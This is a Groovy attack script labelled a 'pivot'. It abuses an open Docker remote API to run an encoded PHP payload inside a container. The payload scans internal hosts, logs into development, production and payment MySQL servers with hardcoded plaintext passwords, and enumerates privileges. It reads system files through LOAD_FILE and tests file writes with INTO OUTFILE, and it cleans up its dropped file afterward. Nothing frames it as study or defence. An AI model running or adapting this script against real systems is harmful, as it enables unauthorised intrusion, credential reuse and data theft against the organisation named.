// DEV Sears pivot: TCP scan + MySQL privs + load_file + outfile
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

echo "===== SECTION 1: TCP CONNECTIVITY MATRIX =====\\n";
$targets = array(
    array("PROD_SEARS_3308",    "172.27.141.24", 3308),
    array("PROD_SEARS_3306",    "172.27.141.24", 3306),
    array("PROD_SEARS_DNS",     "dbasears.mrc-services.io", 3308),
    array("T1PAGOS_3310",       "172.27.141.4",  3310),
    array("T1PAGOS_3306",       "172.27.141.4",  3306),
    array("DEV_SEARS_3308",     "172.27.141.6",  3308),
    array("DEV_SEARS_22",       "172.27.141.6",  22),
    array("PROD_SEARS_22",      "172.27.141.24", 22),
    array("T1PAGOS_22",         "172.27.141.4",  22),
    array("141.1_GW",           "172.27.141.1",  22),
    array("141.24_MYSQL",       "172.27.141.24", 3306),
);
foreach ($targets as $t) {
    list($label, $host, $port) = $t;
    $start = microtime(true);
    $fp = @fsockopen($host, $port, $errno, $errstr, 5);
    $elapsed = round((microtime(true) - $start) * 1000);
    if ($fp) {
        echo "TCP_OPEN|$label|$host:$port|${elapsed}ms\\n";
        fclose($fp);
    } else {
        echo "TCP_CLOSED|$label|$host:$port|${elapsed}ms|$errno|$errstr\\n";
    }
}

echo "\\n===== SECTION 2: DNS RESOLUTION =====\\n";
$dns_targets = array("dbasears.mrc-services.io", "t1pagos.mrc-services.io", "mrc-services.io");
foreach ($dns_targets as $d) {
    $ip = @gethostbyname($d);
    echo "DNS|$d|$ip\\n";
}

echo "\\n===== SECTION 3: DEV SEARS MySQL GRANTS + PRIVS =====\\n";
$dsn = "mysql:host=172.27.141.6;port=3308";
try {
    $pdo = new PDO($dsn, "apifincadodev", "nNzy]Ku2Ah=u%y1I", array(
        PDO::ATTR_TIMEOUT => 8,
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ));
    echo "AUTH_OK|DEV_SEARS|172.27.141.6:3308|apifincadodev\\n";

    // Version + current user
    foreach ($pdo->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn, @@port pt, @@datadir dd, @@secure_file_priv sfp, @@plugin_dir pd") as $r) {
        echo "VERSION=".$r["v"]."\\n";
        echo "CURRENT_USER=".$r["cu"]."\\n";
        echo "HOSTNAME=".$r["hn"]."\\n";
        echo "PORT=".$r["pt"]."\\n";
        echo "DATADIR=".$r["dd"]."\\n";
        echo "SECURE_FILE_PRIV=".$r["sfp"]."\\n";
        echo "PLUGIN_DIR=".$r["pd"]."\\n";
    }

    // Grants
    echo "\\n--- GRANTS ---\\n";
    foreach ($pdo->query("SHOW GRANTS FOR CURRENT_USER()") as $r) {
        echo $r[0]."\\n";
    }

    // Check FILE and SUPER
    echo "\\n--- PRIVILEGE CHECK ---\\n";
    try {
        $res = $pdo->query("SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%apifincadodev%'");
        foreach ($res as $r) { echo "PRIV: ".$r[0]."\\n"; }
    } catch (Exception $e) { echo "PRIV_ENUM_FAIL: ".$e->getMessage()."\\n"; }

    // Try load_file
    echo "\\n===== SECTION 4: FILE PRIVILEGE TEST (load_file) =====\\n";
    $files = array("/etc/passwd", "/etc/hosts", "/etc/my.cnf", "/etc/mysql/my.cnf", "/var/lib/mysql/.my.cnf", "/proc/1/cmdline", "/proc/net/tcp");
    foreach ($files as $f) {
        try {
            $stmt = $pdo->query("SELECT LOAD_FILE('".$f."') AS content");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row["content"] !== null && strlen($row["content"]) > 0) {
                echo "LOAD_FILE_OK|$f|".strlen($row["content"])." bytes\\n";
                echo substr($row["content"], 0, 2000)."\\n";
                echo "---EOF---\\n";
            } else {
                echo "LOAD_FILE_NULL|$f\\n";
            }
        } catch (Exception $e) {
            echo "LOAD_FILE_ERR|$f|".$e->getMessage()."\\n";
        }
    }

    // Try INTO OUTFILE
    echo "\\n===== SECTION 5: INTO OUTFILE TEST =====\\n";
    $outfile_paths = array("/tmp/tr4ns_test.txt", "/var/lib/mysql/tr4ns_test.txt", "/var/tmp/tr4ns_test.txt");
    foreach ($outfile_paths as $op) {
        try {
            $pdo->exec("SELECT 'pivot_test_ok' INTO OUTFILE '".$op."'");
            echo "OUTFILE_OK|$op\\n";
        } catch (Exception $e) {
            echo "OUTFILE_FAIL|$op|".$e->getMessage()."\\n";
        }
    }

    // Check for UDF plugins
    echo "\\n===== SECTION 6: UDF / PLUGIN ENUM =====\\n";
    try {
        $res = $pdo->query("SELECT * FROM mysql.func");
        $count = 0;
        foreach ($res as $r) { echo "UDF: ".implode("|", $r)."\\n"; $count++; }
        if ($count == 0) echo "NO_UDF_REGISTERED\\n";
    } catch (Exception $e) { echo "UDF_ENUM_ERR: ".$e->getMessage()."\\n"; }

    // Try to create function (will fail without SUPER but worth trying)
    echo "\\n--- SUPER privilege test ---\\n";
    try {
        $pdo->exec("CREATE TEMPORARY TABLE _priv_test (x INT)");
        $pdo->exec("DROP TEMPORARY TABLE _priv_test");
        echo "CREATE_TEMP_TABLE: OK\\n";
    } catch (Exception $e) { echo "CREATE_TEMP_TABLE: ".$e->getMessage()."\\n"; }

    // Networking from MySQL host perspective
    echo "\\n===== SECTION 7: MySQL HOST NETWORK (via performance_schema) =====\\n";
    try {
        $res = $pdo->query("SELECT * FROM performance_schema.host_cache LIMIT 20");
        foreach ($res as $r) { echo "HOST_CACHE: ".$r["IP"]." | ".$r["HOST"]."\\n"; }
    } catch (Exception $e) { echo "HOST_CACHE_ERR: ".$e->getMessage()."\\n"; }

    // Global variables for networking
    echo "\\n--- Network vars ---\\n";
    $vars = array("bind_address", "port", "skip_networking", "max_connections", "super_read_only", "read_only");
    foreach ($vars as $v) {
        try {
            $res = $pdo->query("SELECT @@".$v." val");
            $row = $res->fetch(); echo "$v = ".$row["val"]."\\n";
        } catch (Exception $e) { echo "$v = ERROR\\n"; }
    }

} catch (Exception $e) {
    echo "AUTH_FAIL|DEV_SEARS|172.27.141.6:3308|apifincadodev|".$e->getMessage()."\\n";
}

echo "\\n===== SECTION 8: PROD SEARS DIRECT AUTH TEST =====\\n";
$prod_targets = array(
    array("PROD_172.27.141.24:3308", "172.27.141.24", 3308, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("PROD_DNS:3308",           "dbasears.mrc-services.io", 3308, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("T1PAGOS_172.27.141.4:3310","172.27.141.4", 3310, "app_t1", "wUt22Us2CUh#+M="),
);
foreach ($prod_targets as $t) {
    list($label, $host, $port, $user, $pass) = $t;
    $dsn2 = "mysql:host=$host;port=$port";
    try {
        $pdo2 = new PDO($dsn2, $user, $pass, array(PDO::ATTR_TIMEOUT => 6, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        echo "AUTH_OK|$label|$user\\n";
        foreach ($pdo2->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn") as $r) {
            echo "  VER=".$r["v"]." CU=".$r["cu"]." HN=".$r["hn"]."\\n";
        }
        foreach ($pdo2->query("SHOW DATABASES") as $r) { echo "  DB: ".$r[0]."\\n"; }
    } catch (Exception $e) {
        echo "AUTH_FAIL|$label|$user|".$e->getMessage()."\\n";
    }
}

echo "\\nPIVOT_SCAN_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_pivot.php && php /tmp/_pivot.php 2>&1; rm -f /tmp/_pivot.php"

println "########## DEV SEARS PIVOT SCAN ##########"
println execIn(cmd)
